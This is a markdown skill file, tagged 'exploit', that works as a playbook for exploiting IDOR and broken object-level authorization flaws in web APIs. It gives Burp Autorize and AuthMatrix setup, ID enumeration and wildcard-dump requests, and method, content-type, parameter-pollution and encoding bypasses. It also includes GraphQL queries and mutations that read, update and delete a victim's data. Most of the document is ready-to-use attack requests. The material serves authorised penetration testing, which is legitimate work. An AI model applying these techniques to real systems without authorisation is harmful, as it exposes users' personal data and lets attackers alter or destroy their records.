---
name: idor-poc
category: exploit
tags:
  - idor
  - bola
  - broken-access-control
  - authorization
  - bac
triggers:
  - idor vulnerability
  - insecure direct object reference
  - broken object level authorization
  - authorization bypass
  - access control
os: cross-platform
---

# IDOR-POC

## Purpose

Exploit Insecure Direct Object Reference (IDOR) and Broken Object Level Authorization (BOLA) vulnerabilities to access unauthorized resources. IDOR occurs when applications expose internal object references (IDs, filenames) without proper authorization checks.

## Tools

### Autorize (Burp Suite Extension)

- **Description**: Automatic authorization enforcement detection
- **GitHub**: https://github.com/PortSwigger/autorize
- **Install**: BApp Store → Autorize

### AuthMatrix (Burp Suite Extension)

- **Description**: Role-based access control matrix testing
- **GitHub**: https://github.com/SecurityInnovation/AuthMatrix
- **Install**: BApp Store → AuthMatrix

### Authz (Burp Suite Extension)

- **Description**: Lightweight authorization testing
- **Install**: BApp Store → Authz

## Installation

### Autorize Installation

1. Open Burp Suite → Extender → BApp Store
2. Search "Autorize" → Install
3. Autorize tab appears in Burp

### AuthMatrix Installation

1. Download Jython standalone JAR from jython.org
2. Burp Suite → Extender → Options → Python Environment
3. Select Jython JAR (v2.7.0 or greater)
4. BApp Store → AuthMatrix → Install

## IDOR Fundamentals

### What is IDOR?

Insecure Direct Object Reference occurs when:

1. Application uses user-supplied input to access objects
2. No authorization check validates user permissions
3. Attacker changes parameter to access other users' data

### OWASP API1:2023 - BOLA

Broken Object Level Authorization is the #1 risk in OWASP API Security Top 10:

- Object IDs manipulated in requests
- No validation of user-to-object ownership
- Leads to data disclosure, modification, deletion

## ID Enumeration Techniques

### Numeric Values

```
# Sequential integers
GET /api/user/1001
GET /api/user/1002
GET /api/user/1003

# Decimal variations
287789 → 287790 → 287791

# Hexadecimal
0x4642d → 0x4642e → 0x4642f

# Unix timestamps
1695574808 → 1695575098
```

### Common Identifiers

```
# Usernames
/api/profile/john
/api/profile/admin

# Emails
/api/user/john.doe@mail.com
/api/user/admin@company.com

# Base64 encoded
/api/user/am9obi5kb2VAbWFpbC5jb20=
(base64 of john.doe@mail.com)
```

### UUID/GUID Patterns

```
# UUID v1 (time-based) - PREDICTABLE
95f6e264-bb00-11ec-8833-00155d01ef00

# UUID v4 (random) - harder to predict
550e8400-e29b-41d4-a716-446655440000
```

### MongoDB ObjectIds

```
# Structure (12 bytes):
# - 4 bytes: Unix timestamp
# - 3 bytes: Machine identifier
# - 2 bytes: Process ID
# - 3 bytes: Counter

5ae9b90a2c144b9def01ec37
^-------^ timestamp (predictable)
```

### Hashed Parameters

```
# MD5 hash of username
/api/user/098f6bcd4621d373cade4e832627b4f6

# SHA1 hash of email
/api/profile/a94a8fe5ccb19ba61c4c0873d391e987982fbbd3

# If pattern discovered, generate for any user
```

### Wildcard Injection

```
# Try wildcards to dump all records
GET /api/users/*
GET /api/users/%
GET /api/users/_
GET /api/users/.
GET /api/users/..
```

## Autorize Workflow

### Setup

1. Login as HIGH-privileged user (admin)
2. Open Autorize tab → Configuration
3. Login as LOW-privileged user in another browser
4. Copy low-privileged session cookie
5. Paste into "Insert injected header here" textbox

### Configuration Options

```
☑ Check unauthenticated - Test requests without any cookies
☑ Intercept requests from Repeater - Include Repeater traffic
☐ Ignore preconfigured URLs - Skip certain patterns
```

### Interception Filters

```
# Whitelist target domain
Type: Whitelist
Pattern: target.com

# Blacklist static resources (default)
Type: Blacklist
Pattern: .*\.(js|css|png|jpg|gif|ico|svg|woff)
```

### Running Tests

1. Click "Intercept is off" → starts intercepting
2. Browse application as HIGH-privileged user
3. Autorize automatically tests each request with:
   - Original (high-priv) cookies
   - Modified (low-priv) cookies
   - No cookies (unauthenticated)

### Enforcement Status

| Color     | Status           | Meaning                     |
| --------- | ---------------- | --------------------------- |
| 🔴 Red    | Bypassed!        | Authorization vulnerability |
| 🟢 Green  | Enforced!        | Properly protected          |
| 🟡 Yellow | Please configure | Need regex filter           |

### Enforcement Detector

When status is yellow, configure detection:

```
# Response contains error message
Fingerprint: "You are not authorized"
Location: Body

# Response has different content length
Content-Length: 1234

# Response header check
Fingerprint: "HTTP/1.1 403"
Location: Headers
```

## AuthMatrix Workflow

### Setup Roles

1. Open AuthMatrix tab
2. Create roles: Admin, User, Guest, Anonymous
3. Each role represents a privilege level

### Setup Users

1. Create users for each role
2. Assign role checkboxes to users
3. Generate session tokens for each user
4. Enter cookies/tokens in user columns

### Add Requests

1. Right-click request in Proxy/Repeater
2. Select "Send to AuthMatrix"
3. Request appears in Request Table
4. Check boxes for authorized roles

### Configure Regex

```
# Success regex (action succeeded)
Regex: "Welcome|Dashboard|Success"

# Failure regex mode (detect failures)
Regex: "HTTP/1.1 303|Access Denied|Unauthorized"
```

### Run Tests

1. Click "Run" at bottom
2. Results show color-coded matrix:
   - 🟢 Green: No vulnerability
   - 🔴 Red: Potential vulnerability
   - 🔵 Blue: False positive (check tokens)

### Chains Feature

Chains handle dynamic values like CSRF tokens:

```
Chain Name: CSRF Token
Source: Request #1 (page with token)
Extraction Regex: name="csrf" value="([^"]+)"
Destinations: Request #2, Request #3
Replacement Regex: csrf=([^&]+)
```

## HTTP Bypass Techniques

### Method Tampering

```
# Original
POST /api/user/delete HTTP/1.1

# Try alternatives
GET /api/user/delete HTTP/1.1
PUT /api/user/delete HTTP/1.1
PATCH /api/user/delete HTTP/1.1
DELETE /api/user/delete HTTP/1.1
```

### Content-Type Switching

```
# Original (JSON)
Content-Type: application/json
{"user_id": 123}

# Try XML
Content-Type: application/xml
<user><id>123</id></user>

# Try form data
Content-Type: application/x-www-form-urlencoded
user_id=123
```

### Parameter Transformation

```
# Original
{"id": 19}

# Array wrapping
{"id": [19]}

# Object wrapping
{"id": {"id": 19}}

# String conversion
{"id": "19"}
```

### Parameter Pollution

```
# Single parameter
GET /api/user?id=victim_id

# Duplicated (backend might use first or last)
GET /api/user?id=attacker_id&id=victim_id

# Mixed case
GET /api/user?id=victim_id&ID=attacker_id
```

## Manual IDOR Testing

### Step 1: Identify Parameters

```
# URL path parameters
/api/users/12345/profile
/download/document/abc123

# Query parameters
/api/invoice?id=1001
/view?file=report.pdf

# POST body parameters
{"order_id": "ORD-12345"}

# Headers
X-User-ID: 12345
```

### Step 2: Map Access Control

```
User A owns:
- /api/order/1001
- /api/profile/userA
- /api/document/docA123

User B owns:
- /api/order/1002
- /api/profile/userB
- /api/document/docB456
```

### Step 3: Cross-User Testing

```
# As User A, try accessing User B's resources
GET /api/order/1002
GET /api/profile/userB
GET /api/document/docB456
```

### Step 4: Verify Impact

```
# Read access (information disclosure)
Can view other users' data

# Write access (data modification)
Can modify other users' settings

# Delete access (data destruction)
Can delete other users' records
```

## GraphQL IDOR

### Query Manipulation

```graphql
# Original query
query {
  user(id: "my-id") {
    email
    orders {
      id
      total
    }
  }
}

# Modify ID
query {
  user(id: "victim-id") {
    email
    orders {
      id
      total
    }
  }
}
```

### Mutation Testing

```graphql
# Test delete mutation
mutation {
  deleteDocument(id: "victim-document-id")
}

# Test update mutation
mutation {
  updateProfile(userId: "victim-id", data: {...})
}
```

## Common Vulnerable Endpoints

```
# User management
GET /api/user/{id}
GET /api/profile/{username}
PUT /api/user/{id}/settings

# Documents/Files
GET /api/document/{id}
GET /download/{filename}
DELETE /api/file/{id}

# Orders/Transactions
GET /api/order/{order_id}
GET /api/invoice/{invoice_num}
POST /api/order/{id}/refund

# Messages
GET /api/message/{id}
GET /api/conversation/{thread_id}
DELETE /api/message/{id}
```

## Encoding Bypasses

### URL Encoding

```
# Original
/api/user/123

# URL encoded
/api/user/%31%32%33

# Double encoding
/api/user/%2531%2532%2533
```

### Base64 Tricks

```
# If IDs are base64
Original: dXNlcjEyMw== (user123)
Target: dXNlcjQ1Ng== (user456)
```

### Unicode Normalization

```
# Original
/api/user/admin

# Unicode variations
/api/user/ａｄｍｉｎ (fullwidth)
/api/user/ADMIN (uppercase)
```

## Troubleshooting

| Issue                      | Solution                             |
| -------------------------- | ------------------------------------ |
| All requests show yellow   | Configure enforcement detector regex |
| False positives            | Check session token validity         |
| Requests not intercepted   | Verify interception filters          |
| AuthMatrix chains fail     | Check extraction regex grouping      |
| Different response lengths | Use content-based regex, not length  |
| Rate limited               | Add delays between requests          |

## Security Considerations

- IDOR can expose sensitive PII
- May allow account takeover if tokens exposed
- Document all unauthorized access attempts
- Test with multiple privilege levels
- Verify both horizontal and vertical escalation
- Report with clear reproduction steps

## References

- Autorize: https://github.com/PortSwigger/autorize
- AuthMatrix: https://github.com/SecurityInnovation/AuthMatrix
- PayloadsAllTheThings IDOR: https://github.com/swisskyrepo/PayloadsAllTheThings
- OWASP API Security: https://owasp.org/API-Security/
- PortSwigger IDOR: https://portswigger.net/web-security/access-control/idor
